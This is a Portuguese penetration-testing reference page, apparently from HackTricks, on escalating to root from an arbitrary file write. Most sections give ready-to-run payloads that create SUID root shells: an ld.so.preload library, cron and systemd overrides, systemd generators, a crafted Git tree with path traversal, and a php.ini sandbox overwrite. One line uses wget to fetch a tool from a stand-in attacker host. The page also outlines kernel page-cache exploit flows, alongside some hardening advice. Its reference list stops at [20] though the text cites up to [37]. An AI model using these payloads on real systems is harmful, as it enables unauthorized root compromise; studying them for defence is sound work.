# Escrita arbitrária de arquivo como root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` é uma lista de objetos compartilhados em todo o sistema que o vinculador dinâmico carrega antes de outros objetos compartilhados. O modo de execução segura aplica restrições adicionais ao pré-carregamento, portanto, um caminho de biblioteca como `/tmp/pe.so` não é uma técnica universal para binários SUID.\
Se você puder criá-lo ou modificá-lo, um processo que carregue o arquivo carregará a biblioteca listada antes dos demais objetos compartilhados, permitindo a execução de código no contexto desse processo.<sup>[[12]](#references)</sup>

Por exemplo: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Saída de OCR como gravação de arquivo restrita

Um serviço de OCR que permite ao chamador escolher o nome do arquivo salvo pode transformar o texto reconhecido de uma imagem em uma primitiva de **gravação de arquivo restrita**. Os bytes salvos são o texto reconhecido, não os bytes da imagem; portanto, verifique a saída do OCR quanto a erros de sintaxe. Se o destino permitido for executável pela web e aceitar um nome de arquivo `.php`, esse texto poderá ser executado quando solicitado. No MakeSense, um aplicativo de OCR acessível localmente salvou o texto em `/saved/`; depois, seu servidor PHP executado como root executou o arquivo salvo como root. A gravação ficou restrita a esse diretório, sem traversal de diretório demonstrado.<sup>[[37]](#references)</sup>

O privilégio obtido na execução é o do **processo que serve PHP**, não automaticamente o do gravador do OCR. Confirme o mapeamento de execução do destino e a identidade do runtime; um gravador de OCR root associado a um servidor web sem privilégios não faria o PHP ser executado como root.<sup>[[37]](#references)</sup> Compare com o [padrão de upload direto para o web root](../../pentesting-web/file-upload/).

### Git hooks

**Git hooks** são scripts executáveis acionados por eventos em um repositório, incluindo operações de commit e merge. Se um **script ou usuário privilegiado** executar essas ações e um invasor puder **gravar na pasta `.git`**, o hook poderá ser usado para **escalada de privilégios**.<sup>[[13]](#references)</sup>

Por exemplo, é possível **gerar um script** em um repositório Git dentro de **`.git/hooks`** para que ele seja sempre executado quando um novo commit for criado:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Traversal de caminho na exportação de árvore Git privilegiada

Um sincronizador privilegiado pode evitar um checkout e, em vez disso, enumerar um repositório influenciado por um atacante com `git ls-tree`, ler cada blob com `git cat-file`, combinar o caminho informado com um diretório de preparação e gravar o arquivo diretamente. Isso se torna uma **gravação arbitrária de arquivo com os privilégios do sincronizador** quando ele combina `-c safe.directory=*` (desativando a proteção do Git contra repositórios pertencentes a outro usuário) com a ausência de uma verificação de contenção do destino. Um nome absoluto de entrada da árvore faz com que `os.path.join(stage, name)` do Python descarte `stage`; um nome relativo contendo `../` escapa quando o sistema de arquivos o resolve. Como a aplicação materializa a árvore bruta em vez de pedir ao Git para fazer o checkout, a rejeição de caminhos durante o checkout nunca protege o destino da gravação.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Procure esse padrão de código em serviços executados como root, timers, agentes de implantação, importadores de templates e tarefas de backup/restauração:<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

Uma entrada de árvore é codificada como `<mode> SP <name> NUL <raw object ID>`. A opção `git hash-object --literally` permite deliberadamente dados de objeto que a análise normal ou `git fsck` podem rejeitar, então um clone descartável pode criar uma árvore cujo nome de arquivo seja um destino absoluto. Este exemplo cria um blob de arquivo cron, envolve a árvore criada em um commit e move uma branch para ele; a exploração ainda exige permissão para atualizar um repositório consumido pela tarefa privilegiada e um servidor Git que aceite o objeto malformado.<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

O hardening deve abranger tanto a ingestão de repositórios quanto a operação final no sistema de arquivos:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Substitua `safe.directory=*` pelos repositórios exatos em que o serviço precisa confiar e, sempre que possível, processe repositórios sem privilégios de root.
- Rejeite nomes absolutos e qualquer componente `.` ou `..` antes da materialização. Após combinar os caminhos, canonize-os e verifique se o destino permanece dentro da raiz pretendida.
- Evite condições de corrida com symlinks entre a verificação e a abertura: abra caminhos relativos a um descritor de diretório confiável e, no Linux, use `openat2()` com `RESOLVE_BENEATH` e `RESOLVE_NO_SYMLINKS` para caminhos controlados por atacantes.
- Prefira um checkout normal em um diretório isolado a reimplementar o checkout com a saída de plumbing. Se a ingestão de objetos brutos for necessária, habilite a validação do lado do recebimento, como `receive.fsckObjects=true`; não rebaixe as constatações de `receive.fsck.*` relacionadas aos nomes de caminho que são necessárias para rejeitar trees criadas para esse fim.

### Implantação de configurações privilegiadas

Alguns serviços de gerenciamento armazenam o estado pretendido do sistema em um arquivo de configuração e depois o implantam com privilégios elevados. Por exemplo, o [openmediavault armazena configurações em `/etc/openmediavault/config.xml`](https://docs.openmediavault.org/en/7.x/faq.html), e sua [interface RPC](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html) pode aplicar alterações nos serviços. Se uma conta com menos privilégios puder gravar ou substituir esse arquivo, verifique se ela também pode solicitar uma implantação autorizada e se o módulo selecionado consome o campo alterado como root. Chaves de contas SSH, comandos agendados e instalação de pacotes têm pré-requisitos diferentes; a mera presença de um arquivo ou de um XML gravável não comprova nenhum deles. Verifique as permissões do arquivo e do diretório pai, os grupos do usuário que faz a chamada e a autorização RPC, a versão instalada e o consumidor efetivo, sem editar a configuração nem invocar uma operação de aplicação durante a enumeração.

As definições de ações do Fail2Ban em `/etc/fail2ban/action.d/` são outro limite de configuração privilegiada. Um usuário que possa gravar nesse diretório e pesquisá-lo talvez consiga substituir uma definição de ação ou adicionar uma sobrescrita, mas as permissões do diretório, por si só, não comprovam execução de código. Confirme se uma jail habilitada realmente seleciona a ação afetada, se o serviço Fail2Ban a executa com privilégios superiores e se ocorrerão um reload/restart autorizado e um evento de ban correspondente. Uma permissão sudo não relacionada para reiniciar o Fail2Ban só é relevante quando se aplica à invocação exata do serviço e a definição alterada é carregada. A [configuração de ações do Fail2Ban](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5) documenta a relação entre o diretório de ações e as jails; sua [ação de exemplo](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf) mostra que `actionban` é executada quando ocorre um ban, com os privilégios do usuário do serviço. Inspecione as permissões e a configuração efetiva sem alterar ações nem disparar bans durante a enumeração.

Há outro limite quando uma jail habilitada do Fail2Ban usa uma ação de e-mail enriquecida com WHOIS. A [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) envolveu texto WHOIS não confiável direcionado ao GNU mailutils `mail`, cujo processamento de escapes podia executar um comando. Um usuário com menos privilégios que possa gravar arquivos talvez consiga influenciar a resposta se puder alterar a configuração de sobrescrita de servidor do **cliente WHOIS selecionado**; o [`whois.conf(5)` do Debian](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html) documenta um desses arquivos, mas o caminho e o uso variam conforme a instalação. Verifique a jail/ação efetiva, a identidade do serviço, o cliente WHOIS e o caminho de configuração usados, a implementação de mail, o controle da resposta e a correção do fornecedor ou backport instalado. Um arquivo de configuração WHOIS gravável, uma versão do Fail2Ban ou uma ação de e-mail, isoladamente, não comprovam essa cadeia; evite consultar um servidor externo ou disparar bans durante a enumeração passiva.

### Criação de arquivos via TFTP e hooks privilegiados de pacotes

Um serviço TFTP acessível pode atravessar um limite de container ou de usuário local quando as configurações **efetivas** do tftpd-hpa fazem com que ele seja executado como root, exponha a raiz do sistema de arquivos como diretório `--secure` e habilite `--create`. O [manual do tftpd-hpa](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html) descreve as opções de criação e de usuário. Isso pode permitir a criação de um novo arquivo em um diretório de configuração privilegiado, incluindo `/etc/apt/apt.conf.d/`; um arquivo existente ainda pode resistir à substituição. O [manual de configuração do APT](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html) documenta os comandos `APT::Update::Pre-Invoke`. Um `apt update` executado como root pode se tornar o consumidor com privilégios superiores **somente se** ler o novo arquivo de configuração. Confirme os argumentos e a identidade reais do daemon em execução, a acessibilidade e filtragem da rede, a política de criação do diretório de destino, o escopo efetivo da configuração do APT e uma invocação privilegiada posterior. Um arquivo padrão, um diretório de destino gravável ou um comando APT agendado, isoladamente, não comprovam o caminho completo. A triagem passiva deve ler apenas configurações e metadados locais limitados, sem enviar arquivos nem invocar o APT.

### Arquivos de cron e de tempo

Se você puder **gravar arquivos relacionados ao cron que são executados como root**, geralmente poderá obter execução de código na próxima vez que o job for executado. Os alvos interessantes incluem:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- A crontab do próprio root em `/var/spool/cron/` ou `/var/spool/cron/crontabs/`
- Timers do `systemd` e os serviços que eles acionam

Verificações rápidas:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

Caminhos típicos de abuso:

- **Adicionar um novo cron job do root** a `/etc/crontab` ou a um arquivo em `/etc/cron.d/`
- **Substituir um script** já executado por `run-parts`
- **Criar um backdoor em um alvo de timer existente** modificando o script ou binário que ele inicia

Exemplo mínimo de payload de cron:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

Se você só puder gravar dentro de um diretório cron usado por `run-parts`, coloque ali um arquivo executável:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Notas:

- `run-parts` geralmente ignora nomes de arquivo que contêm pontos, então prefira nomes como `backup` em vez de `backup.sh`.<sup>[[15]](#references)</sup>
- Alguns sistemas usam timers do `systemd` em vez do cron clássico, mas a ideia do abuso é a mesma: **modificar o que o root executará mais tarde**.<sup>[[20]](#references)</sup>

### Arquivos de serviço e socket

Se você puder escrever **arquivos de unidade do `systemd`** ou arquivos referenciados por eles, talvez consiga executar código como root recarregando e reiniciando a unidade, ou aguardando que o caminho de ativação do serviço/socket seja acionado.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Verifique também as permissões de escrita e busca no próprio diretório de unidades do sistema, incluindo ACLs: um usuário pode criar uma nova unidade em `/etc/systemd/system` mesmo quando a leitura/listagem do diretório é negada. Esse caminho, por si só, não inicia nada. Confirme que o gerenciador do sistema carregará a nova unidade, que o usuário tem uma permissão efetiva de `systemctl start` ou `restart` capaz de executar como root para o nome dela (ou outro caminho de ativação privilegiado) e que o serviço é executado com a identidade pretendida. Uma unidade existente e carregada que foi alterada no disco pode exigir `daemon-reload`; unidades com novos nomes têm um comportamento de carregamento diferente. Revise os argumentos e as exclusões exatos do sudo antes de considerar suficiente uma regra de reinicialização com curinga. Consulte o [caminho de busca de unidades do systemd](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) e a [semântica de carregamento e recarga do systemctl](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html).

Alvos interessantes incluem:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Substituições drop-in em `/etc/systemd/system/<unit>.d/*.conf`
- Scripts/binários de serviço referenciados por `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Caminhos `EnvironmentFile=` graváveis carregados por um serviço root

Verificações rápidas:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

Caminhos comuns de abuso:

- **Sobrescrever `ExecStart=`** em uma unit de serviço de propriedade de root que você pode modificar
- **Adicionar um override drop-in** com um `ExecStart=` malicioso e limpar o antigo primeiro
- **Instalar um backdoor no script/binário** já referenciado pela unit
- **Sequestrar um serviço ativado por socket** modificando o arquivo `.service` correspondente, que é iniciado quando o socket recebe uma conexão

Exemplo de override malicioso:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Fluxo de ativação típico:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

Se você não puder reiniciar serviços por conta própria, mas puder editar uma unidade ativada por socket, talvez só precise **aguardar uma conexão de cliente** para acionar a execução do serviço backdoored como root.<sup>[[17]](#references)</sup>

### Diretórios de geradores do systemd

**Geradores do sistema** são executáveis iniciados pelo gerenciador do sistema antes de ele carregar os arquivos de unidade, tanto durante a inicialização quanto durante o recarregamento da configuração. Portanto, ter acesso de escrita a um diretório de geradores do sistema (ou a um gerador executável existente) é um vetor direto de execução de código como root, que pode passar despercebido quando uma auditoria verifica apenas arquivos `*.service` e `*.timer`.<sup>[[35]](#references)[[36]](#references)</sup>

A ordem de busca habitual é `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` e `/usr/lib/systemd/system-generators/` (algumas distribuições disponibilizam `/lib/systemd/system-generators/` por meio da unificação de `/usr`). Um executável com o mesmo nome em um diretório anterior prevalece sobre os posteriores. Não confunda esses **diretórios de executáveis de entrada** com `/run/systemd/generator`, `/run/systemd/generator.early` e `/run/systemd/generator.late`, que contêm a saída de unidades temporárias produzida pelos geradores.<sup>[[35]](#references)</sup>

Verificações rápidas:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

Um gerador recém-criado precisa ter o bit de execução definido. Se a primitiva de escrita controlar os bytes, mas não o modo, escolha um gerador que já seja executável; truncá-lo no próprio lugar normalmente preserva seus metadados. Se o próprio diretório permitir escrita, crie uma nova entrada e marque-a como executável.<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

Disparar `systemctl daemon-reload` no manager do **sistema** exige autorização adequada, mas executa novamente todos os generators do sistema; caso contrário, aguarde um reload privilegiado, uma operação de pacote ou uma reinicialização. Diretórios de user generators, como `~/.config/systemd/user-generators/`, são executados pelo user manager e, por si só, **não** fornecem acesso root.<sup>[[35]](#references)</sup>

Para hardening e hunting, verifique cada componente do caminho e as ACLs, não apenas os bits de modo finais; estabeleça uma baseline dos hashes e da propriedade dos pacotes dos generators; e gere alertas para criação, renomeação, alterações de conteúdo ou de permissões em todos os diretórios de entrada dos system generators. Monitorar a gravação é importante porque um generator one-shot pode se excluir após a execução, enquanto a árvore de unidades geradas em `/run/systemd/generator*` é recriada no próximo reload.<sup>[[35]](#references)[[36]](#references)</sup>

### Sobrescrever um `php.ini` restritivo usado por um sandbox PHP privilegiado

Alguns daemons personalizados validam PHP fornecido pelo usuário executando `php` com um **`php.ini` restrito** (por exemplo, `disable_functions=exec,system,...`). Se o código em sandbox ainda tiver **qualquer primitiva de escrita** (como `file_put_contents`) e você conseguir acessar o **caminho exato do `php.ini`** usado pelo daemon, poderá **sobrescrever essa configuração** para remover as restrições e, em seguida, enviar um segundo payload que será executado com privilégios elevados.<sup>[[2]](#references)</sup>

Fluxo típico:

1. O primeiro payload sobrescreve a configuração do sandbox.
2. O segundo payload executa código, agora que as funções perigosas foram reativadas.

Exemplo mínimo (substitua pelo caminho usado pelo daemon):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

Se o daemon for executado como root (ou validar caminhos pertencentes a root), a segunda execução resulta em um contexto de root. Isso é essencialmente **escalonamento de privilégios por sobrescrita de configuração** quando o runtime em sandbox ainda pode gravar arquivos.

### binfmt_misc

`binfmt_misc` expõe registros em `/proc/sys/fs/binfmt_misc`; cada registro associa um padrão de tipo de arquivo a um interpretador. O impacto sobre privilégios depende de quem pode alterar o registro e de qual processo executará posteriormente o arquivo correspondente. Portanto, verifique esses requisitos antes de considerar isso um vetor de escalonamento de privilégios.<sup>[[21]](#references)</sup>

Um helper executável com `CAP_DAC_OVERRIDE` pode oferecer um caminho separado para registrar uma regra caso aceite dados controlados pelo chamador e os grave em `/proc/sys/fs/binfmt_misc/register`, mesmo que o chamador não possa gravar diretamente nesse nó. Revise a entrada e o comportamento de gravação do helper sem executá-lo durante a enumeração. Se uma regra registrada usar a flag `C`, o interpretador recebe credenciais baseadas no binário correspondente; assim, um arquivo SUID pertencente a root pode executar um interpretador controlado pelo chamador como root. Confirme a montagem e a política de registro do `binfmt_misc`, a capacidade efetiva do helper, a regra exata e o caminho do interpretador, o alvo SUID executável e se `no_new_privs` ou uma montagem `nosuid` suprime a transição SUID. Um bit de capacidade ou uma string de caminho embutida, por si só, é apenas uma pista para investigação.<sup>[[21]](#references)</sup> Consulte [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html) para ver as condições que suprimem o SUID.

### Sobrescrever handlers de esquema (como http: ou https:)

Ambientes desktop usam associações MIME e arquivos desktop para escolher um aplicativo para esquemas de URI; um atacante que possa gravar a configuração relevante do usuário e os diretórios de arquivos desktop pode redirecionar esses esquemas para um launcher sob seu controle. Ao modificar o arquivo `$HOME/.config/mimeapps.list` para apontar os handlers de URL HTTP e HTTPS para um arquivo malicioso (por exemplo, `x-scheme-handler/http=evil.desktop` e `x-scheme-handler/https=evil.desktop`), um clique do usuário pode invocar essa entrada desktop.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Root executando scripts/binários graváveis pelo usuário

Se um fluxo de trabalho privilegiado executar algo como `/bin/sh /home/username/.../script` (ou qualquer binário dentro de um diretório pertencente a um usuário sem privilégios), você pode fazer hijack dele:<sup>[[1]](#references)</sup>

- **Detectar a execução:** monitore processos com pspy para detectar o root executando caminhos controlados pelo usuário.<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **Confirmar a permissão de escrita:** certifique-se de que o arquivo de destino e o diretório dele pertencem ao seu usuário ou podem ser escritos por ele.
- **Sequestrar o alvo:** faça backup do binário/script original e coloque um payload que crie um shell SUID (ou execute qualquer outra ação como root); em seguida, restaure as permissões:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **Acione a ação privilegiada** (por exemplo, pressionando um botão da interface que inicia o helper). Quando o root executar novamente o caminho sequestrado, obtenha o shell com privilégios elevados usando `./rootshell -p`.

### Modificação de arquivos somente no page cache de binários privilegiados

Alguns bugs do kernel não modificam o arquivo **em disco**. Em vez disso, permitem modificar apenas a **cópia no page cache** de um arquivo legível. Se você puder atingir um binário **setuid** ou executado de outra forma pelo **root**, a próxima execução poderá executar bytes controlados pelo atacante a partir da memória e elevar privilégios, mesmo que o hash do arquivo em disco permaneça inalterado.<sup>[[3]](#references)[[4]](#references)</sup>

É útil pensar nisso como uma **primitive de escrita em arquivo somente em tempo de execução**:<sup>[[3]](#references)</sup>

- **O disco permanece limpo**: o inode e os bytes em disco não são alterados
- **A memória fica suja**: processos que leem/executam a página em cache obtêm o conteúdo modificado pelo atacante
- **O efeito é temporário**: a alteração desaparece após uma reinicialização ou a expulsão do cache

Essa primitive fica entre a **escrita arbitrária em arquivos** clássica e bugs antigos de **abuso do page cache**, como Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW dependia de uma race condition
- Dirty Pipe tinha restrições de posição de escrita
- Uma primitive somente de page cache pode ser mais confiável se o caminho vulnerável permitir escritas diretas em páginas em cache respaldadas por arquivos

#### Fluxo genérico de privesc

1. Obtenha uma primitive do kernel que possa escrever em **páginas do page cache respaldadas por arquivos**
2. Use-a contra um **binário privilegiado legível** ou outro arquivo executado pelo root
3. Acione a execução **antes** que a página seja expulsa do cache
4. Obtenha execução de código como root enquanto o arquivo em disco ainda parece inalterado

Alvos de alto valor típicos:

- Binários **setuid-root**
- Helpers iniciados por **serviços root**
- Binários comumente executados a partir de **containers que compartilham o kernel/page cache do host**

#### Exemplo de caminho com AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) é um bom exemplo dessa classe. O caminho vulnerável estava na API de criptografia do Linux para userspace (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` pode mover referências a páginas do page cache de um arquivo legível para o scatterlist TX da criptografia
- o caminho de descriptografia in-place de `algif_aead` reutilizava os buffers de origem e destino
- `authencesn` então escrevia na região da tag de destino
- quando essa região ainda referenciava páginas de arquivos inseridas via splice, a escrita atingia o **page cache do arquivo-alvo**

Portanto, a técnica interessante não é a CVE em si, mas o padrão:

- **insira páginas em cache respaldadas por arquivos em um subsistema do kernel**
- faça o subsistema **tratá-las como saída gravável**
- acione uma pequena sobrescrita controlada na memória

O PoC público usou **escritas repetidas de 4 bytes** para corrigir `/usr/bin/su` na memória e, em seguida, executá-lo.<sup>[[4]](#references)[[7]](#references)</sup>

#### Exemplo de caminho com clone ESP / XFRM + netfilter TEE

DirtyClone (CVE-2026-43503) mostra outra variante do mesmo padrão de **escrita em root somente pelo page cache**, mas, desta vez, o destino é a descriptografia IPsec ESP em vez de `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

A técnica importante é a **etapa de lavagem de metadados**:

- `splice()` coloca uma **página do page cache somente leitura, respaldada por arquivo**, em um pacote ESP-in-UDP
- a mitigação original do DirtyFrag marcava esse skb com `SKBFL_SHARED_FRAG` para que `esp_input()` **copiasse antes de descriptografar**
- o netfilter `TEE` duplica o pacote por meio de `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- o clone mantém a **mesma referência à página física do page cache**, mas perde `SKBFL_SHARED_FRAG`
- `esp_input()` então trata o clone como seguro e executa a descriptografia **in-place** `cbc(aes)` sobre a página respaldada por arquivo

Portanto, a lição para revisores vai além da CVE: se uma mitigação depende de **metadados de skb/página** para decidir se uma operação deve primeiro copiar, qualquer **caminho de clone/cópia que preserve a página de suporte, mas descarte os metadados**, pode reabrir silenciosamente a primitive de escrita.

Fluxo típico de exploração:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` para obter **`CAP_NET_ADMIN` dentro de um namespace de rede privado**
2. ativar o loopback e instalar uma regra de **netfilter `TEE`** em `mangle/OUTPUT`
3. instalar SAs de transporte XFRM ESP via `NETLINK_XFRM`
4. codificar cada palavra-alvo de 4 bytes no campo `seq_hi` da SA (o truque de seleção de palavras do DirtyFrag)
5. enviar o pacote ESP-in-UDP inserido via splice para que o **clone TEE** chegue a `esp_input()` e seja descriptografado **in-place**
6. repetir até que a cópia no page cache de `/usr/bin/su` ou de outro executável privilegiado contenha código controlado pelo atacante

Operacionalmente, o impacto é o mesmo do exemplo com `AF_ALG`: o arquivo em disco permanece limpo, mas `execve()` consome os **bytes modificados do page cache** e concede root.<sup>[[8]](#references)[[9]](#references)</sup>

Verificações úteis de exposição para esta variante:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

A redução da superfície de ataque a curto prazo também é específica ao caminho aqui: atualizar para um kernel que inclua `48f6a5356a33` corrige o caminho de clone, enquanto bloquear o carregamento automático de `xt_TEE` remove a **etapa de adulteração de flags** e bloquear `esp4` / `esp6` remove o **sink de descriptografia**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposição e hunting

Se suspeitar dessa classe de bug, não confie apenas em verificações de integridade em disco. Verifique também:

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

Os valores de configuração abaixo distinguem uma interface carregável de uma incorporada ao kernel; as regras de compilação de crypto mapeiam `CONFIG_CRYPTO_USER_API_AEAD` para `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` pode ser carregado/descarregado como um módulo
- `CONFIG_CRYPTO_USER_API_AEAD=y`: a interface é incorporada ao kernel
- binários setuid são bons alvos porque um patch apenas no page cache pode bastar para transformar um acesso local inicial em root

#### Redução da superfície de ataque para o caminho `algif_aead`

Se a interface vulnerável for fornecida por um módulo carregável:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

Se estiver compilado no kernel, algumas divulgações relataram bloquear o caminho do init com:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

Esse tipo de mitigação também vale a pena lembrar para outras LPEs do kernel: se a exploração depende de uma interface opcional específica, desabilitar ou colocar essa interface na blacklist pode interromper o caminho de exploração antes mesmo de uma atualização completa do kernel estar disponível.<sup>[[6]](#references)[[28]](#references)</sup>



{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [HTB Bamboo – sequestrando um script executado como root em um diretório do PaperCut gravável pelo usuário](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) — perguntas frequentes](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Divulgação no Openwall oss-security para CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Correção do Linux stable: crypto: algif_aead - reverter para operação fora do local](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — comunicado sobre CVE-2026-31431](https://copy.fail/)
- [7] [Análise técnica da Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Repositório DirtyClone / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: analisando e explorando a variante de LPE do Linux DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Correção do Linux: net: skb: preservar `SKBFL_SHARED_FRAG` em `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Mitigação anterior do Linux: definir `SKBFL_SHARED_FRAG` para pacotes UDP com splice (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — página de manual do Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Hooks do Git](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — página de manual do Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — página de manual do Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
